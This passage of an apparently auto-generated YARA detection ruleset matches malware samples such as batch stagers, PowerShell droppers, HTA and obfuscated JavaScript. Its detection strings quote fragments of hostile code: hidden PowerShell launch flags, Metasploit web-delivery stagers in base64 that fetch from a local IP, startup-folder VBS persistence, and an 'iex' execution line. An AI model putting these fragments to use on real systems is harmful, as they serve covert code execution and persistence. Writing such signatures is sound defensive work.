      $x3 = "AF1CA0E2.SHELLEXECUTE(\"POWERSHELL.EXE\",\"-EXECUTIONPOLICY UNRESTRICTED -WINDOWSTYLE HIDDEN -NOLOGO -COMMAND \" + FC59FC30,\"\"" ascii /* score: '45.00'*/
      $x4 = "%22.cmd%22)%2c+%22Powershell.exe+-ExecutionPolicy+Bypass+-windowstyle+hidden+-File+%22+%2b+%24TargetPath)%0d%0a++break+%7d%0d%0a" ascii /* score: '44.00'*/
      $x5 = "getPath))%0d%0a++++Powershell.exe+-ExecutionPolicy+Bypass+-WindowStyle+Hidden+-File+%24TargetPath%0d%0a%0d%0a++++%23%5bSystem.IO" ascii /* score: '41.00'*/
      $x6 = "t(%5bSystem.Environment%5d%3a%3aGetFolderPath(7)+%2b+%22%5cWinLOGON.vbs%22%2c+%24StartupContent.Replace(%22%25PT%25%22%2c+%24Tar" ascii /* score: '32.00'*/
      $x7 = "+%22.vbs%22%0d%0a++++%24TargetPath+%3d+%5bSystem.IO.Path%5d%3a%3aGetTempPath()+%2b+%24Filename%0d%0a++++%24CurrSc+%3d+%24A%5b1%5" ascii /* score: '31.00'*/
      $s8 = "tem.Diagnostics.Process%5d%3a%3aStart(%24TargetPath)%0d%0a++break+%7d%0d%0a++%22TR%22+%7b%0d%0a++++%5bString%5d+%24PsFileName+%3" ascii /* score: '28.00'*/
      $s9 = "d%0d%0a++++%5bSystem.IO.File%5d%3a%3aWriteAllText(%24TargetPath%2c+%24CurrSc)%0d%0a++++%5bSystem.Diagnostics.Process%5d%3a%3aSta" ascii /* score: '25.00'*/
      $s10 = "4A%5b2%5d%0d%0a++++%5bSystem.IO.File%5d%3a%3aWriteAllText(%24TargetPath%2c+%24A%5b1%5d)%0d%0a++++%5bSystem.Diagnostics.Process%5" ascii /* score: '25.00'*/
      $s11 = "%5d)+%7b%0d%0a++%22RF%22+%7b%0d%0a++++%24TargetPath+%3d+%5bSystem.IO.Path%5d%3a%3aGetTempPath()+%2b+%24A%5b2%5d%0d%0a++++%5bSyst" ascii /* score: '24.00'*/
      $s12 = "2c34%2c37%2c80%2c84%2c37%2c34%2c44%2c32%2c48))%0d%0a++++%24TargetPath+%3d+%5bSystem.IO.Path%5d%3a%3aGetTempPath()+%2b+%24PsFileN" ascii /* score: '24.00'*/
      $s13 = "rt(%24TargetPath)%0d%0a++break+%7d%0d%0a++%22Sc%22+%7b%0d%0a++++%24TargetPath+%3d+%5bSystem.IO.Path%5d%3a%3aGetTempPath()+%2b+%2" ascii /* score: '24.00'*/
      $s14 = "%2c+%24false)%0d%0a+++++++%24httpobj.SetRequestHeader(%22User-Agent%3a%22%2c+%24info)%0d%0a+++++++%24httpobj.Send(%24Param)%0d%0" ascii /* score: '20.00'*/
      $s15 = "e%27%0d%0a++++%24lol+%3d+%5bSystem.Convert%5d%3a%3aToString((get-wmiobject+Win32_ComputerSystemProduct++%7c+Select-Object+-Expan" ascii /* score: '19.00'*/
   condition:
      uint16(0) == 0x6176 and filesize < 70KB and
      1 of ($x*) and all of them
}

rule sig_3b6ad5d7a5619545a68836b579bcf89d896f146ecaad273966e8489d057c06dc_3b6ad5d7 {
   meta:
      description = "_subset_batch - file 3b6ad5d7a5619545a68836b579bcf89d896f146ecaad273966e8489d057c06dc_3b6ad5d7.js"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3b6ad5d7a5619545a68836b579bcf89d896f146ecaad273966e8489d057c06dc"
   strings:
      $x1 = "b.fn.mousewheel&&f.bind(\"mousewheel.fb\",function(a,c){if(h)a.preventDefault();else if(b(a.target).get(0).clientHeight==0||b(a." ascii /* score: '32.00'*/
      $s2 = "s&&s.length&&n.show();d.showCloseButton&&E.show();Y();d.hideOnContentClick&&j.bind(\"click\",b.fancybox.close);d.hideOnOverlayCl" ascii /* score: '29.00'*/
      $s3 = "rget).get(0).scrollHeight===b(a.target).get(0).clientHeight){a.preventDefault();b.fancybox[c>0?\"prev\":\"next\"]()}});b.support" ascii /* score: '24.00'*/
      $s4 = "37||a.keyCode==39)&&d.enableKeyboardNav&&a.target.tagName!==\"INPUT\"&&a.target.tagName!==\"TEXTAREA\"&&a.target.tagName!==\"SEL" ascii /* score: '20.00'*/
      $s5 = "b.fn.mousewheel&&f.bind(\"mousewheel.fb\",function(a,c){if(h)a.preventDefault();else if(b(a.target).get(0).clientHeight==0||b(a." ascii /* score: '20.00'*/
      $s6 = "]\\.(swf)\\s*$/i,K,L=1,y=0,s=\"\",r,i,h=false,B=b.extend(b(\"<div/>\")[0],{prop:0}),M=b.browser.msie&&b.browser.version<7&&!wind" ascii /* score: '19.00'*/
      $s7 = "true;if(d&&false===d.onCleanup(l,p,d))h=false;else{N();b(E.add(z).add(A)).hide();b(j.add(u)).unbind();b(window).unbind(\"resize." ascii /* score: '18.00'*/
      $s8 = "easingOut:\"swing\",showCloseButton:true,showNavArrows:true,enableEscapeButton:true,enableKeyboardNav:true,onStart:function(){}," ascii /* score: '18.00'*/
      $s9 = "37||a.keyCode==39)&&d.enableKeyboardNav&&a.target.tagName!==\"INPUT\"&&a.target.tagName!==\"TEXTAREA\"&&a.target.tagName!==\"SEL" ascii /* score: '17.00'*/
      $s10 = ";(function(b){var m,t,u,f,D,j,E,n,z,A,q=0,e={},o=[],p=0,d={},l=[],G=null,v=new Image,J=/\\.(jpg|gif|png|bmp|jpeg)(.*)?$/i,W=/[^" ascii /* score: '17.00'*/
      $s11 = "0,C=a.length;k<C;k++)if(typeof a[k]==\"object\")b(a[k]).data(\"fancybox\",b.extend({},g,a[k]));else a[k]=b({}).data(\"fancybox\"" ascii /* score: '16.00'*/
      $s12 = "0\" hspace=\"0\" '+(b.browser.msie?'allowtransparency=\"true\"\"':\"\")+' scrolling=\"'+e.scrolling+'\" src=\"'+d.href+'\"></ifr" ascii /* score: '16.00'*/
      $s13 = "select:not(#fancybox-tmp select)\").filter(function(){return this.style.visibility!==\"hidden\"}).css({visibility:\"hidden\"}).o" ascii /* score: '16.00'*/
      $s14 = "function(){b(this).replaceWith(m.children())});b(a).appendTo(m);F();break;case \"image\":h=false;b.fancybox.showActivity();v=new" ascii /* score: '16.00'*/
      $s15 = "d.cyclic&&l.length>1||p!=l.length-1)A.show()}else{z.hide();A.hide()}},S=function(){if(!b.support.opacity){j.get(0).style.removeA" ascii /* score: '15.00'*/
   condition:
      uint16(0) == 0x2a2f and filesize < 60KB and
      1 of ($x*) and 4 of them
}

rule sig_0f81bee03e15e394a587be71726b59670b8482ddb4c9aa87b91cce1cf8a40d17_0f81bee0 {
   meta:
      description = "_subset_batch - file 0f81bee03e15e394a587be71726b59670b8482ddb4c9aa87b91cce1cf8a40d17_0f81bee0.html"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0f81bee03e15e394a587be71726b59670b8482ddb4c9aa87b91cce1cf8a40d17"
   strings:
      $x1 = "  var _0x2CC7=[\"cjF1S1VQM1ZLemUwN2VoVVRuZlVjOURhZFRQNXF1ZGcvWUcyQm5XRUszNk1LM3dNZWhJT2g1Vmk0bENjSG5WOWtDZWFJajFQbWNidHp3RWlIM2R" ascii /* score: '59.00'*/
      $s2 = "bUZtWnNhWG5PbGxjWFhKaTZXVWFqZHNNKzlRTWZzYTd1blB2dDZTMTR2R2ZQbnZGeTByZXBpRFkxTlc5TEMwWFJXa1kwM2l1OHQ5alM0b2Jhbk5wclU0dGRldnFpNnFQ" ascii /* base64 encoded string 'mFmZsaXnOllcXXJi6WUajdsM+9QMfsa7unPvt6S14vGfPnvFy0repiDY1NW9LC0XRWkY03iu8t9jS4obanNprU4tdevqi6qP' */ /* score: '30.00'*/
      $s3 = "QksrcGE0UTc0ZitIQVVFdStmS0d2aWE0SXIveEcyRTZ5dndndk9EclJqN1VTZCtCeXlqeDZDT3NiQkEyeCtOSjFURzQvaGFJQTY2cDcrdlFtU3FXOEcyK0FXSlErSEhZ" ascii /* base64 encoded string 'BK+pa4Q74f+HAUEu+fKGvia4Ir/xG2E6yvwgvODrRj7USd+Byyjx6COsbBA2x+NJ1TG4/haIA66p7+vQmSqW8G2+AWJQ+HHY' */ /* score: '29.00'*/
      $s4 = "eERUNzRuVGhSRTkwV0V5dzd5dk45UnRPOStZV3diVGVGZUlzSlJ4ekNrbzJmUWcvVXluMGx3ck9jeTZjSXlyWGMrNUxPeitmM25lNHBXbW5hMUFZWDhHSTNvVWpLMGkz" ascii /* base64 encoded string 'xDT74nThRE90WEyw7yvN9RtO9+YWwbTeFeIsJRxzCko2fQg/Uyn0lwrOcy6cIyrXc+5LOz+f3ne4pWmna1AYX8GI3oUjK0i3' */ /* score: '29.00'*/
      $s5 = "aW9jTkc2WXlGY1hManB4dUppYkdYWnVCQlg4MkEyeUxYam43RG8xUFRHV0NKM2dPSmx6UkFBVWZDT1VSU3VJSGZlS1AwSEpoY1VGMU1HY0k0ZGdrZ1VCdWZtN1dGMjRK" ascii /* base64 encoded string 'iocNG6YyFcXLjpxuJibGXZuBBX82A2yLXjn7Do1PTGWCJ3gOJlzRAAUfCOURSuIHfeKP0HJhcUF1MGcI4dgkgUBufm7WF24J' */ /* score: '29.00'*/
      $s6 = "SGtubmFVWFhTS3Q3clB5ZHY5Ujc5d0NpaUF0M05iNUI0eFNaNTNtbjU4U3A4MC9tempLM3NTbU1hbkgzNm0rLzg3N3RDZ2RhVkQ0dXBBODB4dHJoWWNRZjBRL3c2Vlht" ascii /* base64 encoded string 'HknnaUXXSKt7rPydv9R79wCiiAt3Nb5B4xSZ53mn58Sp80/mzjK3sSmManH36m+/877tCgdaVD4upA80xtrhYcQf0Q/w6VXm' */ /* score: '28.00'*/
      $s7 = "TlNaNFZXMStZZGJZWk1VR0I4NXp6R1E2N2VtbnovbFpqMndhZ0xac2FtempNcEhBR0J6V1hOSGJPNkMrN0hJRmM3QkdhclgxMVJYYjJseXpsbjNSRkJUa0IrNnMxT3N2" ascii /* base64 encoded string 'NSZ4VW1+YdbYZMUGB85zzGQ67emnz/lZj2wagLZsamzjMpHAGBzWXNHbO6C+7HIFc7BGarX11RXb2lyzln3RFBTkB+6s1Osv' */ /* score: '28.00'*/
      $s8 = "yeGFXejdmWjJycXo4LzZSMnJLNk43NjZ1dnZuUytyNXk3N1dFZU9IdE93dnQzMDBsK3VVY1NOLzlLK0E2VWFkL1Y1ZXU2QklmcnBMNWZyNCszMS96cmdXMlI0cVBNRjl" ascii /* base64 encoded string 'xaWz7fZ2rqz8/6R2rK6N766uvvnS+r5y77WEeOHtOwvt300l+uUcSN/9K+A6Uad/V5eu6BIfrpL5fr4+31/zrgW2R4qPMF9' */ /* score: '28.00'*/
      $s9 = "WU8vM0x0Rk15ZWVJN3VvZ2NPTDZrSEFBV3BoTXBrUnpDeDdWTmpZK3FuTmxtNTkvNGwxaW9TYnljZWl3NHpNeUJmaUE0NFZ6eUpldDRva1BIOXpYcy9Zc0sxaHFreDZ6" ascii /* base64 encoded string 'YO/3LtFMyeeI7uogcOL6kHAAWphMpkRzCx7VNjY+qnNlm59/4l1ioSbyceiw4zMyBfiA44VzyJet4okPH9zXs/YsK1hqkx6z' */ /* score: '27.00'*/
      $s10 = "OUxRTmpHVHM1S25qZHVMRUNSZGdYNzF5M1Q1NC80S3RyVzRLM0MwcWk4MDBiSmJZY01VTU5DVFFpWkxHZDV2TkxjdzVESEJaZk9ic1dadWJ2ZXRLMGJSb0ltMWFXVVl4" ascii /* base64 encoded string '9LQNjGTs5KnjduLECRdgX71y3T54/4KtrW4K3C0qi800bJbYcMUMNCTQiZLGd5vNLcw5DHBZfObsWZubvetK0bRoIm1aWUYx' */ /* score: '27.00'*/
      $s11 = "eHA3NkJVYldOY2V2cUhMQmNyc2V1UGYrS0pkdnp0clMwWVkrbjV1MWIzL20rblR0LzJRYUdSdno4VE5vY1kvTFBmZTVsKzRXZi95WDdtUzk5MlRZM2R1eDczLzJoUFg0" ascii /* base64 encoded string 'xp76BUbWNcevqHLBcrseuPf+KJdvztrS0YY+n5u1b3/m+nTt/2QaGRvz8TNocY/LPfe5l+4Wf/yX7mS992TY3dux73/2hPX4' */ /* score: '26.00'*/
      $s12 = "ZE9kZUNjaG15bXBvcXE0ZWNRNUFoZDBHUnorZDZmMTlFNWZJRDJqQ2ROR1F0aDgvZWM3aHY1S0NjT1BVcit2REJRZXRuR1E4TmUxaWxaVVhXMDllRnZtdmNGWUY3OSs3" ascii /* base64 encoded string 'dOdeCchmympoqq4ecQ5Ahd0GRz+d6f19E5fID2jCdNGQth8/ec7hv5KCcOPUr+vDBQetnGQ8Ne1ilZUXW09eFvmvcFYF79+7' */ /* score: '26.00'*/
      $s13 = "OVExZFZvd3YzVzQrd2xrY0JtbmRsYUVycHNxQ3BqZnprTzlRUDlLaGUyV0s5S0pyTHEzN1Z0L05OcnVDV1ZJUm51MElVM2lqbnRqZlhsTDgxTzl3dml5bDl0UEl6MWor" ascii /* base64 encoded string '9Q1dVowv3W4+wlkcBmndlaErpsqCpjfzkO9QP9Khe2WK9KJrLq37Vt/NNruCWVIRnu0IU3ijntjfXlL81O9wviyl9tPIz1j+' */ /* score: '26.00'*/
      $s14 = "aGxBajAxV2ZWRndtNTRwTnhKN3VSSkpQV292YVdVSDgxUERwaW8rT2p0cjI3WllzTGM3YTN1eU9Xb3pwV1JDZ0NrbGcwaTRnNUM1YWRHckJNeGZxeWY2amZCb1lIckQz" ascii /* base64 encoded string 'hlAj01WfVFwm54pNxJ7uRJJPWovaWUH81PDpio+Ojtr27ZYsLc7a3uyOWozpWRCgCklg0i4g5C5adGrBMxfqyf6jfBoYHrD3' */ /* score: '26.00'*/
      $s15 = "NzNYTHpqZlpQLzhudldGNml6RFkzN1VWOFRaQ05sTjEyeTExV1ZkNWtlVm1GeU5jVXdwMXlKZDNveURqYXV0bmtPR1RKMElad1hXMTFFK1FrNFhXYmh6N01GYUNvdDJS" ascii /* base64 encoded string '73XLzjfZP/8nvWF6izDY37UV8TZCNlN12y11WVd5keVmFyNcUwp1yJd3oyDjautnkOGTJ0IZwXW11E+Qk4XWbhz7MFaCot2R' */ /* score: '26.00'*/
   condition:
      uint16(0) == 0x213c and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule sig_585a7cd70e0ac2e6342de574213b27bc5c31d318729ccf0eda3064d4fbf2c369_585a7cd7 {
   meta:
      description = "_subset_batch - file 585a7cd70e0ac2e6342de574213b27bc5c31d318729ccf0eda3064d4fbf2c369_585a7cd7.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "585a7cd70e0ac2e6342de574213b27bc5c31d318729ccf0eda3064d4fbf2c369"
   strings:
      $s1 = "=$3@74_5+`" fullword ascii /* score: '9.00'*/ /* hex encoded string '7E' */
      $s2 = "framef" fullword ascii /* score: '8.00'*/
      $s3 = "sleabihf" fullword ascii /* score: '8.00'*/
      $s4 = "amesorto" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x457f and filesize < 2000KB and
      all of them
}

rule sig_1079b95cf206b1a28e9faa615551bada8e7519fb5f63462da289dc89a4f5829a_1079b95c {
   meta:
      description = "_subset_batch - file 1079b95cf206b1a28e9faa615551bada8e7519fb5f63462da289dc89a4f5829a_1079b95c.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1079b95cf206b1a28e9faa615551bada8e7519fb5f63462da289dc89a4f5829a"
   strings:
      $x1 = "TVqQ****M********E********//8****Lg******************Q**************************************************************************" ascii /* score: '36.00'*/
      $s2 = "jN3U5MERVNVZIc1BWM2s4LlZvcDhmV3BnNXZqREdDVE5kdCtGMHgxUElaM0VLR0ttaEZtclRtK1g1ZUZvS1p3ckRUajJNWHhwaXBgMVtbU3lzdGVtLk9iamVjdCwgbXN" ascii /* base64 encoded string '7u90DU5VHsPV3k8.Vop8fWpg5vjDGCTNdt+F0x1PIZ3EKGKmhFmrTm+X5eFoKZwrDTj2MXxpip`1[[System.Object, ms' */ /* score: '21.00'*/
      $s3 = "hdGlvbi5UZXh0SW5mbyVTeXN0ZW0uR2xvYmFsaXphdGlvbi5OdW1iZXJGb3JtYXRJbmZvJ1N5c3RlbS5HbG9iYWxpemF0aW9uLkRhdGVUaW1lRm9ybWF0SW5mbyZTeXN" ascii /* base64 encoded string 'tion.TextInfo%System.Globalization.NumberFormatInfo'System.Globalization.DateTimeFormatInfo&Sys' */ /* score: '21.00'*/
      $s4 = "gUg**QEdBQcg**gET**BMBB****B**RwJI**EdEoDBEYE1Bi**BEwET****Ug**BK**vQYg**B0SgIEOI**MSgTkIHRK**gR0SgIEDI****CBi****HRKBIQIGDg8gBQ" ascii /* score: '14.00'*/
      $s5 = "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj" ascii /* base64 encoded string '################################################################################################' */ /* score: '14.00'*/
      $s6 = "OODM//8Ce6c******QRDxEVKEYE****YoBwQ**BiDf********OMLM//8RJDnQLQ****I**I********o**wQ**BjqszP//JiD+**Q****OKHM//8RDzl/4P//IO****" ascii /* score: '12.00'*/
      $s7 = "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj" ascii /* score: '11.00'*/
      $s8 = "IyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj" ascii /* score: '11.00'*/
      $s9 = "uFGFsbFllYXJNb250aFBhdHRlcm5zFGFsbFNob3J0RGF0ZVBhdHRlcm5zE2FsbExvbmdEYXRlUGF0dGVybnMUYWxsU2hvcnRUaW1lUGF0dGVybnMTYWxsTG9uZ1RpbWV" ascii /* score: '11.00'*/
      $s10 = "9Rsvd17Nms+uiXMJM7H5HFmtLSL5zXCVeJW7LZxNh8OvvVX+ePT/5xtkMhbbxj6nC8koSDMeBdlF/tpKUi9lGV/q0B25KGaT0cD6o8GpwyIeF1aMjNRgaiz+rsQ8f03I" ascii /* score: '11.00'*/
      $s11 = "IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj" ascii /* score: '11.00'*/
      $s12 = "Iw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj" ascii /* score: '11.00'*/
      $s13 = "heU5hbWVzFWFiYnJldmlhdGVkTW9udGhOYW1lcwptb250aE5hbWVzEmdlbml0aXZlTW9udGhOYW1lcx9tX2dlbml0aXZlQWJicmV2aWF0ZWRNb250aE5hbWVzEmxlYXB" ascii /* score: '11.00'*/
      $s14 = "IyMjIyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj" ascii /* score: '11.00'*/
      $s15 = "IyMjIyMjIyMjIyMjIyMjIyMjIw0KIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj" ascii /* score: '11.00'*/
   condition:
      uint16(0) == 0x5654 and filesize < 3000KB and
      1 of ($x*) and 4 of them
}

rule sig_11726a6479703020f67f3e876a0643f718cc9c837b73b488a311e05997f27ee6_11726a64 {
   meta:
      description = "_subset_batch - file 11726a6479703020f67f3e876a0643f718cc9c837b73b488a311e05997f27ee6_11726a64.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "11726a6479703020f67f3e876a0643f718cc9c837b73b488a311e05997f27ee6"
   strings:
      $x1 = "powershell.exe -nop -w hidden -e" fullword ascii /* score: '31.00'*/
      $s2 = "web deliverer of metasploit" fullword ascii /* score: '15.00'*/
      $s3 = "WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwB" fullword ascii /* base64 encoded string '[ N e t . S e r v i c e P o i n t M a n a g e r ] : : S ' */ /* score: '14.00'*/
      $s4 = "AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGU" fullword ascii /* base64 encoded string ' [ S y s t e m . N e t . W e b P r o x y ] : : G e t D e' */ /* score: '10.00'*/
      $s5 = "LwAxADkAMgAuADEANgA4AC4ANQA4AC4AMQA5ADIAOgA4ADAAOAAwAC8AOABiAHkAaQBxAFcAbgB" fullword ascii /* base64 encoded string '/ 1 9 2 . 1 6 8 . 5 8 . 1 9 2 : 8 0 8 0 / 8 b y i q W n ' */ /* score: '10.00'*/
      $s6 = "cAB6AEcARwBvAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAA" fullword ascii /* base64 encoded string 'p z G G o . P r o x y . C r e d e n t i a l s = [ N e t ' */ /* score: '10.00'*/
      $s7 = "YACcAKQApADsA" fullword ascii /* base64 encoded string ' ' ) ) ; ' */ /* score: '10.00'*/
      $s8 = "AGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAOAAuADEAOQAyADoAOAAwADg" fullword ascii /* base64 encoded string ' g ( ' h t t p : / / 1 9 2 . 1 6 8 . 5 8 . 1 9 2 : 8 0 8' */ /* score: '10.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 4KB and
      1 of ($x*) and all of them
}

rule sig_5a598d22aa48b752c7aa66c6977116688b410ed3d2f8fabd43fd16d973b5ba5d_5a598d22 {
   meta:
      description = "_subset_batch - file 5a598d22aa48b752c7aa66c6977116688b410ed3d2f8fabd43fd16d973b5ba5d_5a598d22.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "5a598d22aa48b752c7aa66c6977116688b410ed3d2f8fabd43fd16d973b5ba5d"
   strings:
      $x1 = "powershell.exe -nop -w hidden -e" fullword ascii /* score: '31.00'*/
      $s2 = "WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwB" fullword ascii /* base64 encoded string '[ N e t . S e r v i c e P o i n t M a n a g e r ] : : S ' */ /* score: '14.00'*/
      $s3 = "AFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGU" fullword ascii /* base64 encoded string ' [ S y s t e m . N e t . W e b P r o x y ] : : G e t D e' */ /* score: '10.00'*/
      $s4 = "LwAxADkAMgAuADEANgA4AC4ANQA4AC4AMQA5ADIAOgA4ADAAOAAwAC8AOABiAHkAaQBxAFcAbgB" fullword ascii /* base64 encoded string '/ 1 9 2 . 1 6 8 . 5 8 . 1 9 2 : 8 0 8 0 / 8 b y i q W n ' */ /* score: '10.00'*/
      $s5 = "cAB6AEcARwBvAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAA" fullword ascii /* base64 encoded string 'p z G G o . P r o x y . C r e d e n t i a l s = [ N e t ' */ /* score: '10.00'*/
      $s6 = "YACcAKQApADsA" fullword ascii /* base64 encoded string ' ' ) ) ; ' */ /* score: '10.00'*/
      $s7 = "AGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAOAAuADEAOQAyADoAOAAwADg" fullword ascii /* base64 encoded string ' g ( ' h t t p : / / 1 9 2 . 1 6 8 . 5 8 . 1 9 2 : 8 0 8' */ /* score: '10.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 3KB and
      1 of ($x*) and all of them
}

rule sig_2178aaaa78be8034bd09b3a9035e19cb82f48fd788d5afca3ee3938a729bf0ef_2178aaaa {
   meta:
      description = "_subset_batch - file 2178aaaa78be8034bd09b3a9035e19cb82f48fd788d5afca3ee3938a729bf0ef_2178aaaa.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "2178aaaa78be8034bd09b3a9035e19cb82f48fd788d5afca3ee3938a729bf0ef"
   strings:
      $x1 = "powershell.exe -nop -w hidden -e" fullword ascii /* score: '31.00'*/
      $s2 = "WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwB" fullword ascii /* base64 encoded string '[ N e t . S e r v i c e P o i n t M a n a g e r ] : : S ' */ /* score: '14.00'*/
      $s3 = "OAAuADEAOQAyADoAOAAwADgAMAAvAE8ARgBPADgARwBVAEMAQgBzAFUAJwApACkAOwA=" fullword ascii /* base64 encoded string '8 . 1 9 2 : 8 0 8 0 / O F O 8 G U C B s U ' ) ) ; ' */ /* score: '14.00'*/
      $s4 = "AGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADUAOAAuADEAOQAyADoAOAAwADgAMAAvAE8" fullword ascii /* base64 encoded string ' h t t p : / / 1 9 2 . 1 6 8 . 5 8 . 1 9 2 : 8 0 8 0 / O' */ /* score: '14.00'*/
      $s5 = "AFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGY" fullword ascii /* base64 encoded string ' S y s t e m . N e t . W e b P r o x y ] : : G e t D e f' */ /* score: '14.00'*/
      $s6 = "TwBOAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgB" fullword ascii /* base64 encoded string 'O N . P r o x y . C r e d e n t i a l s = [ N e t . C r ' */ /* score: '14.00'*/
      $s7 = "BsACkAewAkAHUAOQBPAE4ALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlA" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x6f70 and filesize < 3KB and
      1 of ($x*) and all of them
}

rule sig_1218d828318dad2548877070c8f4f1d88409b3be0026ee3ad32d75b42344d740_1218d828 {
   meta:
      description = "_subset_batch - file 1218d828318dad2548877070c8f4f1d88409b3be0026ee3ad32d75b42344d740_1218d828.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "1218d828318dad2548877070c8f4f1d88409b3be0026ee3ad32d75b42344d740"
   strings:
      $s1 = "iex (-join ($a | % {[char]$_}))" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x6124 and filesize < 40KB and
      all of them
}

rule sig_12764e4909b2d35f94835f67f02bee352b37c924904fa0cc12eadaa3e70d910f_12764e49 {
   meta:
      description = "_subset_batch - file 12764e4909b2d35f94835f67f02bee352b37c924904fa0cc12eadaa3e70d910f_12764e49.hta"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "12764e4909b2d35f94835f67f02bee352b37c924904fa0cc12eadaa3e70d910f"
   strings:
      $s1 = "  <!-- style overrides from user selected background image -->" fullword ascii /* score: '25.00'*/
      $s2 = "squarespace.com/universal/scripts-compressed/parking-page-3303d06b90b2d1da-min.en-US.js\" ></script><link rel=\"stylesheet\" typ" ascii /* score: '23.00'*/
      $s3 = "    <a href=\"http://www.squarespace.com\" target=\"_blank\">" fullword ascii /* score: '22.00'*/
      $s4 = "  <link href=\"https://fonts.googleapis.com/css?family=Montserrat\" rel=\"stylesheet\" type=\"text/css\">" fullword ascii /* score: '22.00'*/
      $s5 = "  <script src=\"//assets.squarespace.com/@sqs/polyfiller/1.6/modern.js\" type=\"text/javascript\" crossorigin=\"anonymous\"></sc" ascii /* score: '20.00'*/
      $s6 = "  <script crossorigin=\"anonymous\" src=\"//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-2849b2404e71" ascii /* score: '20.00'*/
      $s7 = "-moment-js-vendor-6f2a1f6ec9a41489-min.en-US.js\" ></script><script crossorigin=\"anonymous\" src=\"//assets.squarespace.com/uni" ascii /* score: '20.00'*/
      $s8 = "  <script src=\"//assets.squarespace.com/@sqs/polyfiller/1.6/legacy.js\" nomodule type=\"text/javascript\" crossorigin=\"anonymo" ascii /* score: '20.00'*/
      $s9 = "  <script crossorigin=\"anonymous\" src=\"//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-2849b2404e71" ascii /* score: '20.00'*/
      $s10 = "  <script src=\"//assets.squarespace.com/@sqs/polyfiller/1.6/legacy.js\" nomodule type=\"text/javascript\" crossorigin=\"anonymo" ascii /* score: '20.00'*/
      $s11 = "8-min.en-US.js\" ></script><script crossorigin=\"anonymous\" src=\"//assets.squarespace.com/universal/scripts-compressed/extract" ascii /* score: '20.00'*/
      $s12 = "  <meta http-equiv=\"X-UA-Compatible\" content=\"chrome=1\">" fullword ascii /* score: '15.00'*/
      $s13 = "      <img src=\"//assets.squarespace.com/universal/images-v6/damask/logo-light.svg\" />" fullword ascii /* score: '14.00'*/
